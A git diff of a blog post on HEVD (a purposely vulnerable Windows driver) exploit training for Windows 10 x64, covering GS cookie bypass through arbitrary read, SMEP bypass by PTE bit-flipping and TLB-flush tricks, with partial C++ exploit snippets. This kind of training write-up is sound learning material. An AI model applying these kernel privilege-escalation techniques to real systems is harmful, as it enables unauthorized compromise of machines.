@@ -8,28 +8,27 @@ tags:
 ---
 
 ## Introduction
-This is my first blog post on HEVD exploit training (and the first blog post overall). I'm writing this to return my debt to the tech community that posted HEVD write-ups that helped me learn so much. There are a lot of HEVD write-ups but unfortunately not for updated systems - usually the write-ups are for Windows 7 and 32-bit. 
+Hey all! This is my first blog post on HEVD exploit training (and the first personal blog post overall). I'm writing this to return my debt to the tech community that posted HEVD [write](https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#)-[ups](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) that helped me learn so much about practical exploitation. There are a lot of HEVD write-ups but unfortunately, not for updated systems - usually the write-ups are for Windows 7 and 32-bit. 
 
 This post is all about updated Windows 10 x64, one that I got directly from [Hyper-V Manager's "Quick Create" method](https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/quick-create-virtual-machine) (Windows 10 dev environment).
 The post will assume knowledge of basic exploitation methods and x86/64 assembly.
 
-Exploiting Stack Overflow with GS (Stack protection) enabled on x64 programs is not straight-forward. Moreover, it seems like it's not possible on its own. For that reason, we will chain together an Arbitrary Read exploit to help us in exploiting it. The reason it's needed is explained in this post.  
+Exploiting Stack Overflow with GS (Stack protection) enabled on x64 programs is not straight-forward. Moreover, it seems like it's not possible on its own. For that reason, we will chain together an Arbitrary Read primitive to help us in exploiting it. The reason it's needed is explained later in this post.  
 
-Bypassing SMEP is also interesting as CR4 modification is protected using HyperGuard. We'll do it using PTE bit-flipping and see how to not cause a double-fault BSOD when trying to execute our usermode shellcode.  
-My method of training involves writing (almost) everything from scratch and because in a later post we will need to adjust our shellcode, I will also include here my own method of writing the shellcode.
+Bypassing SMEP is also interesting as CR4 modification is protected by HyperGuard. We'll do it using PTE bit-flipping and see how to deal with a lesser-known caveat of this method.  
 
 Our setup will be:
 * Windows 10 version 2004 build 19041.746 as the Host machine
 * Windows 10 version 2004 build 19041.685 as the Guest machine running on Hyper-V
 * Windbg Preview as the kernel debugger  
-Also important to note that we assume the integrity level of Medium. Otherwise, some primitives that we use here won't work.
+
+*Also important to note that we assume the integrity level of Medium. Otherwise, some primitives that we use here won't work.
 
 The exploitation steps are:
 1. Analyze the vulnerability in IDA
-2. Trigger the vulnerability and find interesting offsets
-3. Bypass GS stack protection
-4. Write a token-stealing shellcode
-5. Bypass SMEP
+2. Bypass GS stack protection
+3. Bypass SMEP
+4. Putting it all together
 
 
 ## Analyzing the vulnerability
@@ -93,7 +92,7 @@ With our read primitive we'll read the address we calculated.
 But then comes the tricky part - we need to know both the cookie, but also the RSP value **at the start of the function**.  
 At first, this seems like a problem, because the stack is dynamic so how could we predict its value when we exploit the buffer overflow?  
 
-I'm not so sure about my chosen method, but the theory is sound and in practice it works everytime.
+I'm not so sure about my chosen method, but the theory is sound and in practice it works every time.
 The plan is this:
 1. Calculate/leak/find somehow a stack address in the kernel
 2. Find constants or predictable values in the stack the we'll use as anchors
@@ -143,7 +142,7 @@ ffff928d`8b2d18d0  07 20 22 00 00 00 00 00-e5 8d c1 28 05 f8 ff ff  . "........(
 ffff928d`8b2d1998  07 20 22 00 0c e4 ff ff-00 00 00 00 80 00 10 00  . ".............
 ffff928d`8b2d1ab8  07 20 22 00 cc cc cc cc-00 9e 11 0c 88 00 00 00  . ".............
 ```
-The IOCTL is 0x222007 so we search it from current RSP and up, and we've found multiple results.
+The IOCTL is 0x222007 so we search it from the current RSP and up, and we've found multiple results.
 
 Step 3 is pretty simple and looks like this:
 ```cpp
@@ -179,17 +178,118 @@ Evaluate expression:
 The results show that the RSP that gets xored with the cookie is predicted to be ```CTL_CODE_ADDRESS - 0x2a8```.  
 Now we have all that we need to bypass the GS stack protection and move on to getting our shellcode executed.
 
-
-
-## Writing the shellcode
-
 ## Bypassing SMEP
 The best result for me was getting arbitrary shellcode executed. If we reach that step, we can do everything we want in that shellcode from the kernel's context.  
 As we have no way of allocating our shellcode in the kernel's memory with Execute permissions we have to either construct a rop that does just that or allocate our shellcode in usermode memory and construct a rop chain that executes it.  
-We'll choose the later as it's easier. But the major obstacle we need to get through is SMEP - a protection that bugchecks if the kernel tries to execute code that's found in usermode address.  
+
+We'll choose the latter as it's easier. But the major obstacle we need to get through is SMEP - a protection that bugchecks (BSOD) if the kernel tries to execute code that's found in usermode address.  
 SMEP status is determined by the 20th bit in the CR4 register. It's a privileged register so only the kernel can modify its contents. The classic and easiest way of bypassing it's by disabling it in the CR4 register using a rop gadget like ```mov cr4, rcx```.
+  
+The problem is that the CR4 register [is protected](https://www.microsoft.com/security/blog/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/#:~:text=Unauthorized%20modifications,instantly.) [by VBS](https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf) on updated systems.  
+We have a choice here - to choose a path that doesn't collide with SMEP like stack pivoting (I'll give an example of that in the next post), or to bypass it in another way.  
+The other way of bypassing SMEP is by flipping a bit in the PTE struct that describes the memory page of our usermode shellcode. It's summarized pretty well by [CoreSecurity](https://www.coresecurity.com/sites/default/files/private-files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf) so I advise to read it.  
+In summary, even though SMEP is enabled by the CR4 register, it's enforced according to the "Owner" field of the PTE struct of the memory page.  
+The "Owner" flag can be either S (0/Supervisor/Kernel) or U (1/Usermode). Only if it's set to U, the CR4 SMEP flag is consulted.  
+A simple test shows that this method is not protected by VBS :)  
+Therefore after flipping this bit on our shellcode's PTE we can then call it directly from the kernel.  
+  
+So how are we going to do this? There are few steps:
+1. Getting the PTE base address (randomized since RS1)
+2. Reading our shellcode's PTE
+3. Writing back to the PTE with the "Owner" bit flipped
+
+An interesting function in relation to this is MiGetPteAddress. It's an unexported function in the kernel that receives a Virtual Address as an argument and returns the address of its PTE.  
+This function teaches us two things: one, the (simple) algorithm of calculating the PTE address of any given memory location.
+Two, MiGetPteAddress contains the PteBase address after randomization (highlighted):  
+![](/assets/images/bof_gs/migetpteaddress_ida.jpg)
+
+Rewriting the logic in a C function looks like this:
+```cpp
+uintptr_t getPteAddress(PVOID addr, PVOID base)
+{
+	uintptr_t address = addr;
+	address = address >> 9;
+	address &= 0x7FFFFFFFF8;
+	address += (intptr_t)base;
+	return address;
+}
+```
+
+We need the PteBase address so we'll use our read primitive to parse the address from the function's code.  
+Because it's an unexported function, we can either use an hardcoded pre-determined offset or find it dynamically using a pattern-searching method. I'll use an hardcoded offset this time:
+
+```cpp
+// Add 0x13 to read only the PTE base
+uintptr_t readAddress = (uintptr_t)ntoskrnlBase + MiGetPteAddressOffset + 0x13;
+arbReadBuf.readAddress = readAddress;
+arbReadBuf.outBuf = &readBuffer;
+
+printf("[+] Getting PteBase value\n");
+bResult = DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &arbReadBuf, sizeof(arbReadBuf), NULL, 0, &junk, (LPOVERLAPPED)NULL);
+
+printf("[*] Got PteBase: 0x%llx\n", outBuf);
+ULONGLONG pteBase = outBuf;
+uintptr_t shellcodePte = getPteAddress(shellcode, pteBase);
+```
+
+Now that we got the PTE address of our shellcode we need to read its data:
+```cpp
+arbReadBuf.readAddress = shellcodePte;
+arbReadBuf.outBuf = &readBuffer;
+bResult = DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &arbReadBuf, sizeof(arbReadBuf), NULL, 0, &junk, (LPOVERLAPPED)NULL);
+
+// Reset the User bit to zero - now it's kernel
+ULONGLONG wantedPteValue = readBuffer & ~0x4;
+```
+
+Now we know what data we want to write (wantedPteValue) and where to write it to (shellcodePte). The actual writing will happen in the rop chain because we don't have an arbitrary write primitive.  
 
 ## Putting it all together
+
+*INSERT ROP BUILDING HERE*
+
+Tracing the exploit, we that our SMEP bypass worked and we successfully switched the Owner bit to Kernel mode.
+The shellcode address is ```0x27e04bd0000``` and we'll use the ```!pte``` command that shows us the parsed PTE struct:
+```s
+2: kd> !pte 0000027e04bd0000
+                                           VA 0000027e04bd0000
+PXE at FFFFBCDE6F379020    PPE at FFFFBCDE6F204FC0    PDE at FFFFBCDE409F8128    PTE at FFFFBC813F025E80
+contains 0A00000078189867  contains 0A0000008000A867  contains 0A0000007C58B867  contains 0000000084A92863
+pfn 78189     ---DA--UWEV  pfn 8000a     ---DA--UWEV  pfn 7c58b     ---DA--UWEV  pfn 84a92     ---DA--KWEV
+```
+PXE/PTE/PPE all indicate "U", as it should be, because it's really a user mode address. But the PTE shows "K" because we changed it with our exploit.
+Continuing the exploit now will result in an exception: ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY.  
+This is a known BSOD that comes from... SMEP protection?!
+![](/assets/images/bof_gs/butwhy.jpg)
+
+After some debugging I got a tip that maybe it's a cache problem. Of course, that's all the point of the [TLB](https://en.wikipedia.org/wiki/Translation_lookaside_buffer).  
+The TLB is a small buffer in the CPU that caches page table entries of recently accessed virtual memory addresses.
+The problem is that when the ROP chain runs and reaches our shellcode, the shellcode is still in the TLB from when we initialized it. We need to make sure that when the ROP runs, we'll get a miss from the TLB.
+We can solve this in two ways:
+1. Fill the TLB cache with other addresses
+2. Run a cpu instruction that flushes the cache
+
+Doing this the first way involves accessing a large enough amount of addresses between initializing our shellcode and running the exploit. The TLB size is under 100, but I decided to over-do it because it performed better:
+```cpp
+#define CACHE_SPRAY_SIZE 3000
+
+void * arr[CACHE_SPRAY_SIZE];
+    char arr2[CACHE_SPRAY_SIZE];
+    for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
+        arr[i] = malloc(4096);
+        //arr[i] = VirtualAlloc(NULL, 5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        *(char*)arr[i] = 1;
+        arr2[i] = *(char*)arr[i];
+        *(char*)arr[i] = arr2[i] + 2;
+    }
+```
+It seems to improve our exploitation chances greatly but still, every once in a while, it would crash. I tried using __clflush intrinsic on our shellcode address to flush it from cache - didn't help. I tried increasing spray numbers - didn't help.
+Also making sure our spray happens on all CPU cores didn't help.
+
+The second method is working every time for me. It uses the [wbinvd](https://www.felixcloutier.com/x86/wbinvd) cpu instruction that invalidates internal caches. It's a privileged instruction so it can only be run in kernel mode.  
+Therefore to use it, we'll include it in our rop gadget.  
+Ideally, we would put the wbinvd gadget in our chain and run the exploit once, but in this specific case we have a very restricted stack size of 0x30 and that doesn't let us include both the SMEP bypass and the wbinvd gadget in it. No worries, we'll just run it twice - once with rop chain that flips the PTE bit, and the second time with wbinvd gadget that eventually calls our shellcode.
+![](/assets/images/bof_gs/yay_run.jpg)
 
 ## Thanks
 
